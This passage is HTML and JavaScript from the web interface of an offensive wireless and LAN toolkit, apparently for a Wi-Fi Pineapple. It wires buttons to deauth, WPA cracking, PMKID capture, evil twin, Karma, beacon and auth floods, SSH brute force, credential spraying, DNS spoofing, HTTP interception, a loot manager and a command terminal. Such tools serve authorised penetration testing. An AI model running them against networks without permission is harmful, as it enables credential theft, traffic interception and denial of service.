      <button class="btn btn-yellow" onclick="stop(\'crack\')" style="margin-left:8px">&#9632; Stop</button>
    </div></div>
  </div>

  <div id="page-wifi-pmkid" class="page hidden">
    <div class="panel"><div class="panel-title">PMKID CAPTURE</div><div class="panel-body">
      <p style="color:var(--dim);margin-bottom:10px">Clientless WPA2 attack — no connected client needed.</p>
      <div class="form-row"><label>BSSID</label><input id="pmkid-bssid" placeholder="AA:BB:CC:DD:EE:FF"></div>
      <div class="form-row"><label>Channel</label><input id="pmkid-ch" value="6" style="width:80px"></div>
      <button class="btn btn-red" onclick="doPmkid()">&#9670; Start</button>
      <button class="btn btn-yellow" onclick="stop(\'pmkid\')" style="margin-left:8px">&#9632; Stop</button>
    </div></div>
  </div>

  <div id="page-wifi-evil-twin" class="page hidden">
    <div class="panel"><div class="panel-title">EVIL TWIN</div><div class="panel-body">
      <div class="form-row"><label>SSID to Clone</label><input id="et-ssid" placeholder="TargetNetwork"></div>
      <div class="form-row"><label>Channel</label><input id="et-ch" value="6" style="width:80px"></div>
      <div class="form-row"><label>Portal</label><select id="et-portal"><option value="">-- None --</option></select></div>
      <button class="btn btn-red" onclick="doEvilTwin()">&#9670; Start</button>
      <button class="btn btn-yellow" onclick="stop(\'evil_twin\')" style="margin-left:8px">&#9632; Stop</button>
    </div></div>
  </div>

  <div id="page-wifi-karma" class="page hidden">
    <div class="panel"><div class="panel-title">KARMA ATTACK</div><div class="panel-body">
      <p style="color:var(--dim);margin-bottom:10px">Responds to all probe requests, luring devices to connect.</p>
      <div class="form-row"><label>Channel</label><input id="karma-ch" value="6" style="width:80px"></div>
      <button class="btn btn-red" onclick="doKarma()">&#9670; Start</button>
      <button class="btn btn-yellow" onclick="stop(\'karma\')" style="margin-left:8px">&#9632; Stop</button>
    </div></div>
  </div>

  <div id="page-wifi-beacon" class="page hidden">
    <div class="panel"><div class="panel-title">BEACON FLOOD</div><div class="panel-body">
      <div class="form-row"><label>SSIDs (one per line)</label>
        <textarea id="beacon-ssids" rows="6" placeholder="Free WiFi\nStarbucks\nATT WiFi\nxfinitywifi"></textarea></div>
      <button class="btn btn-orange" onclick="doBeacon()">&#9670; Start</button>
      <button class="btn btn-blue" onclick="loadBeaconFromScan()" style="margin-left:8px">&#9670; Load from Scan</button>
      <button class="btn btn-yellow" onclick="stop(\'beacon_flood\')" style="margin-left:8px">&#9632; Stop</button>
    </div></div>
  </div>

  <div id="page-wifi-probe" class="page hidden">
    <div class="panel"><div class="panel-title">PROBE HARVEST</div><div class="panel-body">
      <p style="color:var(--dim);margin-bottom:10px">Captures what SSIDs nearby devices are searching for.</p>
      <div class="form-row"><label>Duration (s)</label><input id="probe-dur" value="60" style="width:80px"></div>
      <button class="btn btn-blue" onclick="doProbe()">&#9670; Start</button>
      <button class="btn btn-yellow" onclick="stop(\'probe_harvest\')" style="margin-left:8px">&#9632; Stop</button>
    </div></div>
    <div class="panel"><div class="panel-title">RESULTS</div><div class="panel-body">
      <div class="rbox" id="probe-results">Waiting...</div>
    </div></div>
  </div>

  <div id="page-wifi-auth-flood" class="page hidden">
    <div class="panel"><div class="panel-title">AUTH FLOOD (AP DoS)</div><div class="panel-body">
      <div class="form-row"><label>BSSID</label><input id="af-bssid" placeholder="AA:BB:CC:DD:EE:FF"></div>
      <div class="form-row"><label>Channel</label><input id="af-ch" value="6" style="width:80px"></div>
      <button class="btn btn-red" onclick="doAuthFlood()">&#9670; Start</button>
      <button class="btn btn-yellow" onclick="stop(\'auth_flood\')" style="margin-left:8px">&#9632; Stop</button>
    </div></div>
  </div>

  <div id="page-wifi-wps" class="page hidden">
    <div class="panel"><div class="panel-title">WPS SCAN</div><div class="panel-body">
      <button class="btn btn-blue" onclick="doWps()">&#9670; Scan</button>
      <span id="wps-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">WPS APs</div><div class="panel-body">
      <table><thead><tr><th>BSSID</th><th>CH</th><th>RSSI</th><th>WPS</th><th>Locked</th><th>SSID</th></tr></thead>
      <tbody id="wps-body"><tr><td colspan="6" style="color:var(--dim)">Not scanned</td></tr></tbody></table>
    </div></div>
  </div>

  <div id="page-wifi-chanhop" class="page hidden">
    <div class="panel"><div class="panel-title">CHANNEL HOP</div><div class="panel-body">
      <p style="color:var(--dim);margin-bottom:10px">Cycles through channels for passive discovery.</p>
      <div class="form-row"><label>Band</label>
        <select id="hop-band" style="width:120px"><option value="2">2.4 GHz</option><option value="5">5 GHz</option></select></div>
      <button class="btn btn-blue" onclick="doChanHop()">&#9670; Start</button>
      <button class="btn btn-yellow" onclick="stop(\'channel_hop\')" style="margin-left:8px">&#9632; Stop</button>
    </div></div>
  </div>

  <div id="page-lan-arp" class="page hidden">
    <div class="panel"><div class="panel-title">ARP SCAN</div><div class="panel-body">
      <div class="form-row"><label>Subnet</label><input id="arp-subnet" value="172.16.52.0/24"></div>
      <button class="btn btn-green" onclick="doArp()">&#9670; Scan</button>
    </div></div>
    <div class="panel"><div class="panel-title">HOSTS <span id="arp-count" style="color:var(--dim)"></span></div><div class="panel-body">
      <table><thead><tr><th>IP</th><th>MAC</th><th>Vendor</th><th>Actions</th></tr></thead>
      <tbody id="arp-body"><tr><td colspan="4" style="color:var(--dim)">Run scan</td></tr></tbody></table>
    </div></div>
  </div>

  <div id="page-lan-ping" class="page hidden">
    <div class="panel"><div class="panel-title">PING SWEEP</div><div class="panel-body">
      <div class="form-row"><label>Subnet</label><input id="ping-subnet" value="172.16.52.0/24"></div>
      <button class="btn btn-green" onclick="doPing()">&#9670; Sweep</button>
      <span id="ping-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">LIVE HOSTS</div><div class="panel-body">
      <div class="rbox" id="ping-results">Waiting...</div>
    </div></div>
  </div>

  <div id="page-lan-portscan" class="page hidden">
    <div class="panel"><div class="panel-title">PORT SCAN</div><div class="panel-body">
      <div class="form-row"><label>Target IP</label><input id="ps-target" placeholder="172.16.52.100"></div>
      <div class="form-row"><label>Ports</label><input id="ps-ports" value="1-1024" style="width:120px"></div>
      <button class="btn btn-blue" onclick="doPort()">&#9670; Scan</button>
      <button class="btn btn-orange" onclick="doServiceScan()" style="margin-left:8px">&#9670; Full Service Scan</button>
    </div></div>
    <div class="panel"><div class="panel-title">RESULTS</div><div class="panel-body">
      <pre class="out" id="ps-out">Waiting...</pre>
    </div></div>
  </div>

  <div id="page-lan-servicescan" class="page hidden">
    <div class="panel"><div class="panel-title">SERVICE SCAN (nmap -sV -sC -p-)</div><div class="panel-body">
      <p style="color:var(--dim);margin-bottom:10px">Full version detection + scripts. Slow but thorough.</p>
      <div class="form-row"><label>Target IP</label><input id="ss-target" placeholder="172.16.52.100"></div>
      <button class="btn btn-blue" onclick="doServiceScanPage()">&#9670; Start</button>
      <span id="ss-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">OUTPUT</div><div class="panel-body">
      <pre class="out" id="ss-out">Waiting...</pre>
    </div></div>
  </div>

  <div id="page-lan-os" class="page hidden">
    <div class="panel"><div class="panel-title">OS DETECTION</div><div class="panel-body">
      <div class="form-row"><label>Target IP</label><input id="os-target" placeholder="172.16.52.100"></div>
      <button class="btn btn-blue" onclick="doOs()">&#9670; Detect</button>
      <span id="os-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">RESULT</div><div class="panel-body">
      <pre class="out" id="os-out">Waiting...</pre>
    </div></div>
  </div>

  <div id="page-lan-banner" class="page hidden">
    <div class="panel"><div class="panel-title">BANNER GRAB</div><div class="panel-body">
      <div class="form-row"><label>Target IP</label><input id="banner-target" placeholder="172.16.52.100"></div>
      <button class="btn btn-blue" onclick="doBanner()">&#9670; Grab</button>
      <span id="banner-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">BANNERS</div><div class="panel-body">
      <table><thead><tr><th>Port</th><th>Banner</th></tr></thead>
      <tbody id="banner-body"><tr><td colspan="2" style="color:var(--dim)">Waiting...</td></tr></tbody></table>
    </div></div>
  </div>

  <div id="page-lan-creds" class="page hidden">
    <div class="panel"><div class="panel-title">DEFAULT CREDENTIAL SPRAY</div><div class="panel-body">
      <p style="color:var(--dim);margin-bottom:10px">Tries common credentials against HTTP basic auth and login forms.</p>
      <div class="form-row"><label>Target IP</label><input id="cred-target" placeholder="192.168.1.1"></div>
      <button class="btn btn-orange" onclick="doCreds()">&#9670; Spray</button>
    </div></div>
  </div>

  <div id="page-lan-ssh" class="page hidden">
    <div class="panel"><div class="panel-title">SSH BRUTE FORCE</div><div class="panel-body">
      <div class="form-row"><label>Target IP</label><input id="ssh-target" placeholder="172.16.52.100"></div>
      <div class="form-row"><label>Port</label><input id="ssh-port" value="22" style="width:80px"></div>
      <button class="btn btn-red" onclick="doSsh()">&#9670; Start</button>
    </div></div>
  </div>

  <div id="page-lan-smb" class="page hidden">
    <div class="panel"><div class="panel-title">SMB ENUMERATION</div><div class="panel-body">
      <div class="form-row"><label>Target IP</label><input id="smb-target" placeholder="172.16.52.100"></div>
      <button class="btn btn-blue" onclick="doSmb()">&#9670; Enumerate</button>
      <span id="smb-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">OUTPUT</div><div class="panel-body">
      <pre class="out" id="smb-out">Waiting...</pre>
    </div></div>
  </div>

  <div id="page-lan-snmp" class="page hidden">
    <div class="panel"><div class="panel-title">SNMP WALK</div><div class="panel-body">
      <div class="form-row"><label>Target IP</label><input id="snmp-target" placeholder="172.16.52.100"></div>
      <div class="form-row"><label>Community</label><input id="snmp-comm" value="public" style="width:140px"></div>
      <button class="btn btn-blue" onclick="doSnmp()">&#9670; Walk</button>
      <span id="snmp-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">OUTPUT</div><div class="panel-body">
      <pre class="out" id="snmp-out">Waiting...</pre>
    </div></div>
  </div>

  <div id="page-lan-ssl" class="page hidden">
    <div class="panel"><div class="panel-title">SSL CERTIFICATE</div><div class="panel-body">
      <div class="form-row"><label>Target</label><input id="ssl-target" placeholder="192.168.1.1"></div>
      <div class="form-row"><label>Port</label><input id="ssl-port" value="443" style="width:80px"></div>
      <button class="btn btn-blue" onclick="doSsl()">&#9670; Grab Cert</button>
      <span id="ssl-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">CERTIFICATE</div><div class="panel-body">
      <div class="rbox" id="ssl-out">Waiting...</div>
    </div></div>
  </div>

  <div id="page-lan-mdns" class="page hidden">
    <div class="panel"><div class="panel-title">mDNS / SSDP DISCOVERY</div><div class="panel-body">
      <button class="btn btn-blue" onclick="doMdns()">&#9670; Discover</button>
    </div></div>
    <div class="panel"><div class="panel-title">DEVICES</div><div class="panel-body">
      <table><thead><tr><th>IP</th><th>Protocol</th><th>Server</th></tr></thead>
      <tbody id="mdns-body"><tr><td colspan="3" style="color:var(--dim)">Not scanned</td></tr></tbody></table>
    </div></div>
  </div>

  <div id="page-lan-dns-spoof" class="page hidden">
    <div class="panel"><div class="panel-title">DNS SPOOF</div><div class="panel-body">
      <div class="form-row"><label>Domain</label><input id="dns-domain" placeholder="example.com"></div>
      <div class="form-row"><label>Redirect IP</label><input id="dns-redirect" placeholder="10.0.0.1"></div>
      <button class="btn btn-red" onclick="doDnsSpoof()">&#9670; Add Entry</button>
    </div></div>
  </div>

  <div id="page-lan-http" class="page hidden">
    <div class="panel"><div class="panel-title">HTTP INTERCEPT</div><div class="panel-body">
      <p style="color:var(--dim);margin-bottom:10px">Redirects port 80 to intercept server. Captures GET/POST.</p>
      <div class="form-row"><label>Interface</label><input id="http-iface" value="wlan0" style="width:100px"></div>
      <button class="btn btn-red" onclick="doHttpInt()">&#9670; Start</button>
      <button class="btn btn-yellow" onclick="stop(\'http_intercept\')" style="margin-left:8px">&#9632; Stop</button>
    </div></div>
  </div>

  <div id="page-osint-mac" class="page hidden">
    <div class="panel"><div class="panel-title">MAC VENDOR LOOKUP</div><div class="panel-body">
      <div class="form-row"><label>MAC Address</label><input id="mac-addr" placeholder="AA:BB:CC:DD:EE:FF"></div>
      <button class="btn btn-purple" onclick="doMac()">&#9670; Lookup</button>
      <button class="btn btn-blue" onclick="macFromScan()" style="margin-left:8px">&#9670; Lookup All from Scan</button>
    </div></div>
    <div class="panel"><div class="panel-title">RESULT</div><div class="panel-body">
      <div class="rbox" id="mac-result">Waiting...</div>
    </div></div>
  </div>

  <div id="page-osint-ipgeo" class="page hidden">
    <div class="panel"><div class="panel-title">IP GEOLOCATION</div><div class="panel-body">
      <p style="color:var(--dim);margin-bottom:10px">Requires internet access from the Pineapple.</p>
      <div class="form-row"><label>IP Address</label><input id="geo-ip" placeholder="8.8.8.8"></div>
      <button class="btn btn-purple" onclick="doGeo()">&#9670; Geolocate</button>
    </div></div>
    <div class="panel"><div class="panel-title">RESULT</div><div class="panel-body">
      <div class="rbox" id="geo-result">Waiting...</div>
    </div></div>
  </div>

  <div id="page-osint-whois" class="page hidden">
    <div class="panel"><div class="panel-title">WHOIS</div><div class="panel-body">
      <div class="form-row"><label>Domain or IP</label><input id="whois-target" placeholder="example.com"></div>
      <button class="btn btn-purple" onclick="doWhois()">&#9670; Query</button>
      <span id="whois-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">RESULT</div><div class="panel-body">
      <pre class="out" id="whois-out">Waiting...</pre>
    </div></div>
  </div>

  <div id="page-osint-dns" class="page hidden">
    <div class="panel"><div class="panel-title">DNS ENUMERATION</div><div class="panel-body">
      <p style="color:var(--dim);margin-bottom:10px">Queries A/AAAA/MX/NS/TXT/CNAME/SOA. Attempts zone transfer.</p>
      <div class="form-row"><label>Domain</label><input id="dns-enum-d" placeholder="example.com"></div>
      <button class="btn btn-purple" onclick="doDnsEnum()">&#9670; Enumerate</button>
      <span id="dns-enum-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">RECORDS</div><div class="panel-body">
      <div class="rbox" id="dns-enum-out">Waiting...</div>
    </div></div>
  </div>

  <div id="page-osint-dnsbrute" class="page hidden">
    <div class="panel"><div class="panel-title">SUBDOMAIN BRUTE FORCE</div><div class="panel-body">
      <div class="form-row"><label>Domain</label><input id="dnsb-d" placeholder="example.com"></div>
      <button class="btn btn-purple" onclick="doDnsBrute()">&#9670; Start</button>
      <span id="dnsb-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">FOUND</div><div class="panel-body">
      <table><thead><tr><th>Subdomain</th><th>IP</th></tr></thead>
      <tbody id="dnsb-body"><tr><td colspan="2" style="color:var(--dim)">Waiting...</td></tr></tbody></table>
    </div></div>
  </div>

  <div id="page-osint-wifigeo" class="page hidden">
    <div class="panel"><div class="panel-title">WIFI GEOLOCATION</div><div class="panel-body">
      <p style="color:var(--dim);margin-bottom:10px">Uses Mozilla Location Service with scanned BSSIDs. Run AP scan first.</p>
      <button class="btn btn-purple" onclick="doWifiGeo()">&#9670; Geolocate from Scan</button>
    </div></div>
    <div class="panel"><div class="panel-title">RESULT</div><div class="panel-body">
      <div class="rbox" id="wgeo-result">Run AP scan first, then click Geolocate.</div>
    </div></div>
  </div>

  <div id="page-osint-http" class="page hidden">
    <div class="panel"><div class="panel-title">HTTP FINGERPRINTING</div><div class="panel-body">
      <div class="form-row"><label>Target IP or Domain</label><input id="hfp-target" placeholder="192.168.1.1"></div>
      <div class="form-row"><label>Port</label><input id="hfp-port" value="80" style="width:80px"></div>
      <button class="btn btn-purple" onclick="doHttpFp()">&#9670; Fingerprint</button>
      <span id="hfp-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">RESULT</div><div class="panel-body">
      <div class="rbox" id="hfp-out">Waiting...</div>
    </div></div>
  </div>

  <div id="page-osint-sysrecon" class="page hidden">
    <div class="panel"><div class="panel-title">SYSTEM RECON</div><div class="panel-body">
      <p style="color:var(--dim);margin-bottom:10px">Interfaces, connected clients, routes, disk, processes, nftables, DHCP leases.</p>
      <button class="btn btn-purple" onclick="doSysRecon()">&#9670; Run Recon</button>
      <span id="sr-status" style="color:var(--dim);margin-left:10px"></span>
    </div></div>
    <div class="panel"><div class="panel-title">INTERFACES</div><div class="panel-body"><pre class="out" id="sr-iface">-</pre></div></div>
    <div class="panel"><div class="panel-title">CLIENTS (br-lan / br-evil)</div><div class="panel-body"><pre class="out" id="sr-clients">-</pre></div></div>
    <div class="panel"><div class="panel-title">DHCP LEASES</div><div class="panel-body"><pre class="out" id="sr-leases">-</pre></div></div>
    <div class="panel"><div class="panel-title">NFTABLES</div><div class="panel-body"><pre class="out" id="sr-nft">-</pre></div></div>
  </div>

  <div id="page-loot" class="page hidden">
    <div class="panel"><div class="panel-title">LOOT MANAGER</div><div class="panel-body">
      <button class="btn btn-blue" onclick="loadLoot()">&#9670; Refresh</button>
    </div></div>
    <div class="panel"><div class="panel-title">FILES</div><div class="panel-body">
      <table><thead><tr><th>File</th><th>Category</th><th>Size</th><th>Modified</th><th></th></tr></thead>
      <tbody id="loot-body"><tr><td colspan="5" style="color:var(--dim)">No loot yet</td></tr></tbody></table>
    </div></div>
  </div>

  <div id="page-terminal" class="page hidden">
    <div class="panel" style="height:calc(100vh - 220px);display:flex;flex-direction:column">
      <div class="panel-title" style="display:flex;align-items:center;justify-content:space-between">
        <span>&#9654; TERMINAL</span>
        <span style="font-size:11px;color:var(--dim)">
          <button class="btn btn-yellow btn-sm" onclick="termClear()">Clear</button>
          &nbsp;
          <button class="btn btn-blue btn-sm" onclick="termToggleLive()">Live Log: <span id="term-live-status">ON</span></button>
          &nbsp;
          <button class="btn btn-red btn-sm" onclick="termKillAll()">Kill All Jobs</button>
        </span>
      </div>
      <div id="term-out" style="flex:1;overflow-y:auto;padding:10px;font-size:12px;line-height:1.5;background:#020208;font-family:monospace;white-space:pre-wrap;word-break:break-all"></div>
      <div style="display:flex;border-top:1px solid #222;background:#03030a">
        <span style="color:var(--title);padding:8px 10px;font-size:13px">&#9658;</span>
        <input id="term-input" style="flex:1;background:transparent;border:none;color:var(--green);font-size:13px;padding:6px 4px;outline:none;font-family:monospace" placeholder="enter command..." autocomplete="off" spellcheck="false" onkeydown="if(event.key==='Enter')termRun()">
        <button class="btn btn-green btn-sm" style="margin:4px 8px" onclick="termRun()">Run</button>
      </div>
    </div>
  </div>


  </div>
  <div id="log-bar"><div id="log-entries"></div></div>
</div></div>

<script>
const API=window.location.origin;let scanResults=[];
async function api(path,method='GET',body=null){
  try{const o={method,headers:{'Content-Type':'application/json'}};if(body)o.body=JSON.stringify(body);
  const r=await fetch(API+path,o);
  if(!r.ok&&r.status!==404){toast('HTTP '+r.status+' on '+path,'#ff2828');return{error:'HTTP '+r.status};}
  return await r.json();}catch(e){
    console.error(path,e);
    if(path.startsWith('/api/')&&method==='POST')toast('API error: '+e.message,'#ff8c00');
    return{error:e.message};}}
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
const TITLES={'dashboard':'OVERVIEW','wifi-scan':'AP SCANNER','wifi-deauth':'DEAUTH',
  'wifi-capture':'HANDSHAKE CAPTURE','wifi-crack':'WPA CRACK','wifi-pmkid':'PMKID',
  'wifi-evil-twin':'EVIL TWIN','wifi-karma':'KARMA','wifi-beacon':'BEACON FLOOD',
  'wifi-probe':'PROBE HARVEST','wifi-auth-flood':'AUTH FLOOD','wifi-wps':'WPS SCAN',
  'wifi-chanhop':'CHANNEL HOP','lan-arp':'ARP SCAN','lan-ping':'PING SWEEP',
  'lan-portscan':'PORT SCAN','lan-servicescan':'SERVICE SCAN','lan-os':'OS DETECT',
  'lan-banner':'BANNER GRAB','lan-creds':'DEFAULT CREDS','lan-ssh':'SSH BRUTE',
  'lan-smb':'SMB ENUM','lan-snmp':'SNMP WALK','lan-ssl':'SSL CERT',
  'lan-mdns':'mDNS DISCOVERY','lan-dns-spoof':'DNS SPOOF','lan-http':'HTTP INTERCEPT',
  'osint-mac':'MAC LOOKUP','osint-ipgeo':'IP GEO','osint-whois':'WHOIS',
  'osint-dns':'DNS ENUM','osint-dnsbrute':'DNS BRUTE','osint-wifigeo':'WIFI GEO',
  'osint-http':'HTTP FINGERPRINT','osint-sysrecon':'SYS RECON','loot':'LOOT','terminal':'TERMINAL'};
function show(id){
  document.querySelectorAll('.page').forEach(p=>p.classList.add('hidden'));
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  const el=document.getElementById('page-'+id);if(el)el.classList.remove('hidden');
  document.getElementById('page-title').textContent=TITLES[id]||id.toUpperCase();
  if(event&&event.target&&event.target.classList)event.target.classList.add('active');
  if(id==='loot')loadLoot();
  if(id==='wifi-crack')loadCrackSelects();
  if(id==='wifi-evil-twin')loadPortals();}
function pollUntilIdle(cb,max=60){
  let n=0,sawBusy=false;
  const t=setInterval(async()=>{
    n++;
    const s=await api('/api/state');
    if(!s||s.error){if(n>=max){clearInterval(t);cb(null);}return;}
    if(s.active_module!=='idle')sawBusy=true;
    if(sawBusy&&s.active_module==='idle'){clearInterval(t);cb(s);return;}
    if(n>=max){clearInterval(t);cb(s);}
  },1000);
}
function toast(msg,col){
  const d=document.createElement('div');
  d.textContent=msg;
  d.style.cssText='position:fixed;bottom:20px;right:20px;background:#111;border:1px solid '+col+';color:'+col+';padding:8px 16px;border-radius:3px;font-family:monospace;font-size:12px;z-index:9999';
  document.body.appendChild(d);setTimeout(()=>d.remove(),3000);
}

function sigBar(dbm){const p=Math.max(0,Math.min(100,(dbm+100)*2));
  const c=p>60?'#00ff50':p>30?'#ffdc00':'#ff2828';
  return '<div class="sig"><div class="sig-fill" style="width:'+p+'%;background:'+c+'"></div></div> '+dbm;}
function renderScan(aps){
  const rows=aps.map(a=>'<tr><td>'+esc(a.ssid)+'</td><td style="font-size:11px;color:var(--dim)">'+a.bssid+'</td><td>'+a.channel+'</td>'+
    '<td><span class="tag '+(a.enc==='Open'?'tag-red':'tag-green')+'">'+esc(a.enc)+'</span></td>'+
    '<td>'+(a.clients||0)+'</td><td>'+sigBar(a.signal)+'</td><td>'+
    '<button class="btn btn-red btn-sm" onclick="quickDeauth(\''+a.bssid+'\',\''+a.channel+'\')">Deauth</button> '+
    '<button class="btn btn-orange btn-sm" onclick="quickCap(\''+a.bssid+'\',\''+a.channel+'\',\''+esc(a.ssid).replace(/\'/g,'')+'\')">Cap</button> '+
    '<button class="btn btn-blue btn-sm" onclick="quickTwin(\''+esc(a.ssid).replace(/\'/g,'')+'\',\''+a.channel+'\')">Twin</button>'+
    '</td></tr>').join('');
  const sb=document.getElementById('scan-body');const db=document.getElementById('d-ap-body');
  if(sb)sb.innerHTML=rows||'<tr><td colspan="7" style="color:var(--dim)">No APs</td></tr>';
  if(db)db.innerHTML=rows||'<tr><td colspan="7" style="color:var(--dim)">No APs</td></tr>';
  const sc=document.getElementById('scan-count');const dc=document.getElementById('d-ap-count');
  if(sc)sc.textContent='('+aps.length+')';if(dc)dc.textContent='('+aps.length+')';}
function renderArp(hosts){const tbody=document.getElementById('arp-body');if(!tbody)return;
  tbody.innerHTML=hosts.map(h=>'<tr><td>'+h.ip+'</td><td style="font-size:11px;color:var(--dim)">'+(h.mac||'')+'</td><td style="color:var(--dim)">'+(h.vendor||'')+'</td><td>'+
    '<button class="btn btn-blue btn-sm" onclick="document.getElementById(\'ps-target\').value=\''+h.ip+'\';show(\'lan-portscan\')">Scan</button> '+
    '<button class="btn btn-orange btn-sm" onclick="document.getElementById(\'cred-target\').value=\''+h.ip+'\';show(\'lan-creds\')">Creds</button> '+
    '<button class="btn btn-purple btn-sm" onclick="document.getElementById(\'geo-ip\').value=\''+h.ip+'\';show(\'osint-ipgeo\');doGeo()">Geo</button>'+
    '</td></tr>').join('');
  const c=document.getElementById('arp-count');if(c)c.textContent='('+hosts.length+')';}
function g(id){return document.getElementById(id);}
function gv(id){const el=g(id);return el?el.value:'';}
async function doScan(){
  g('scan-status').textContent='Scanning... (12s)';
  g('scan-body').innerHTML='<tr><td colspan="7" style="color:var(--dim)">Scanning...</td></tr>';
  await api('/api/wifi/scan','POST',{});
  pollUntilIdle(async()=>{const sc=await api('/api/scans');
    if(sc&&Array.isArray(sc)){scanResults=sc;renderScan(sc);g('scan-status').textContent='Done ('+sc.length+' APs)';}
    else g('scan-status').textContent='Done';},30);}
async function doDeauth(){const b=gv('da-bssid');if(!b)return alert('BSSID required');
  await api('/api/wifi/deauth','POST',{bssid:b,channel:gv('da-ch'),count:gv('da-count'),client:gv('da-client')});}
function quickDeauth(b,c){show('wifi-deauth');g('da-bssid').value=b;g('da-ch').value=c;doDeauth();}
async function doCapture(){const b=gv('cap-bssid');if(!b)return alert('BSSID required');
  const r=await api('/api/wifi/capture','POST',{bssid:b,ssid:gv('cap-ssid'),channel:gv('cap-ch')});
  if(r.file)g('cap-status').textContent='Capturing: '+r.file;}
async function doCapDeauth(){await doCapture();const b=gv('cap-bssid');
  if(b)await api('/api/wifi/deauth','POST',{bssid:b,channel:gv('cap-ch'),count:'10'});}
function quickCap(b,c,s){show('wifi-capture');g('cap-bssid').value=b;g('cap-ch').value=c;g('cap-ssid').value=s;}
function quickTwin(s,c){show('wifi-evil-twin');g('et-ssid').value=s;g('et-ch').value=c;}
async function loadCrackSelects(){const loot=await api('/api/loot');
  const caps=loot.filter(l=>l.name.endsWith('.cap'));
  g('crack-cap').innerHTML=caps.map(c=>'<option value="'+c.path+'">'+c.name+'</option>').join('')||'<option>No cap files</option>';
  const wls=await api('/api/wordlists');
  g('crack-wl').innerHTML=wls.map(w=>'<option value="'+w.path+'">'+w.name+' ('+(w.size/1024/1024).toFixed(1)+'MB)</option>').join('')||'<option>No wordlists</option>';}
async function doCrack(){const c=gv('crack-cap');const w=gv('crack-wl');
  if(!c||!w)return alert('Select cap and wordlist');
  await api('/api/wifi/crack','POST',{cap_file:c,wordlist:w});}
async function doPmkid(){const b=gv('pmkid-bssid');if(!b)return alert('BSSID required');
  await api('/api/wifi/pmkid','POST',{bssid:b,channel:gv('pmkid-ch')});}
async function loadPortals(){const p=await api('/api/portals');
  g('et-portal').innerHTML='<option value="">-- None --</option>'+p.map(x=>'<option value="'+x+'">'+x+'</option>').join('');}
async function doEvilTwin(){const s=gv('et-ssid');if(!s)return alert('SSID required');
  await api('/api/wifi/evil_twin','POST',{ssid:s,channel:gv('et-ch'),portal:gv('et-portal')});}
async function doKarma(){await api('/api/wifi/karma','POST',{channel:gv('karma-ch')});}
async function doBeacon(){const ssids=gv('beacon-ssids').split('\n').map(x=>x.trim()).filter(Boolean);
  if(!ssids.length)return alert('Enter SSIDs');await api('/api/wifi/beacon_flood','POST',{ssids});}
function loadBeaconFromScan(){if(!scanResults.length)return alert('Run scan first');
  g('beacon-ssids').value=scanResults.map(a=>a.ssid).filter(s=>s!=='<hidden>').join('\n');}
async function doProbe(){const dur=parseInt(gv('probe-dur'))||60;
  await api('/api/wifi/probe_harvest','POST',{duration:dur});
  pollUntilIdle(async()=>{const d=await api('/api/data/probe_results');
    g('probe-results').textContent=d&&d.length?d.map(r=>r.mac+': '+r.probes.join(', ')).join('\n'):'No probes captured';},dur+10);}
async function doAuthFlood(){const b=gv('af-bssid');if(!b)return alert('BSSID required');
  await api('/api/wifi/auth_flood','POST',{bssid:b,channel:gv('af-ch')});}
async function doWps(){g('wps-status').textContent='Scanning...';
  g('wps-body').innerHTML='<tr><td colspan="6" style="color:var(--dim)">Scanning...</td></tr>';
  await api('/api/wifi/wps_scan','POST',{});
  pollUntilIdle(async(s)=>{g('wps-status').textContent=s?s.module_status:'';
    const d=await api('/api/data/wps_results');
    if(d&&d.length)g('wps-body').innerHTML=d.map(w=>'<tr><td>'+w.bssid+'</td><td>'+w.channel+'</td><td>'+w.rssi+'</td><td>'+w.wps_ver+'</td><td>'+w.locked+'</td><td>'+esc(w.ssid)+'</td></tr>').join('');
    else g('wps-body').innerHTML='<tr><td colspan="6">None found</td></tr>';},35);}
async function doChanHop(){await api('/api/wifi/channel_hop','POST',{band:gv('hop-band')});}
async function doArp(){const subnet=gv('arp-subnet')||'172.16.52.0/24';
  const tbody=g('arp-body');if(tbody)tbody.innerHTML='<tr><td colspan="4" style="color:var(--dim)">Scanning...</td></tr>';
  await api('/api/lan/arp_scan','POST',{subnet});}
async function doPing(){const subnet=gv('ping-subnet');g('ping-status').textContent='Sweeping...';
  await api('/api/lan/ping_sweep','POST',{subnet});
  pollUntilIdle(async(s)=>{g('ping-status').textContent=s?s.module_status:'';
    const d=await api('/api/data/ping_sweep');g('ping-results').textContent=d?d.join('\n'):'No hosts';},30);}
async function doPort(){const t=gv('ps-target');if(!t)return alert('Target required');
  g('ps-out').textContent='Scanning...';await api('/api/lan/port_scan','POST',{target:t,ports:gv('ps-ports')});
  pollUntilIdle(async()=>{const d=await api('/api/data/last_portscan');if(d&&d.raw)g('ps-out').textContent=d.raw;},60);}
async function doServiceScan(){const t=gv('ps-target');if(!t){show('lan-servicescan');return;}
  g('ss-target').value=t;show('lan-servicescan');doServiceScanPage();}
async function doServiceScanPage(){const t=gv('ss-target');if(!t)return alert('Target required');
  g('ss-status').textContent='Running (may take 5+ min)...';g('ss-out').textContent='Scanning all ports...';
  await api('/api/lan/service_scan','POST',{target:t});
  pollUntilIdle(async(s)=>{g('ss-status').textContent=s?s.module_status:'';
    const d=await api('/api/data/last_servicescan');if(d&&d.raw)g('ss-out').textContent=d.raw;},400);}
async function doOs(){const t=gv('os-target');if(!t)return alert('Target required');
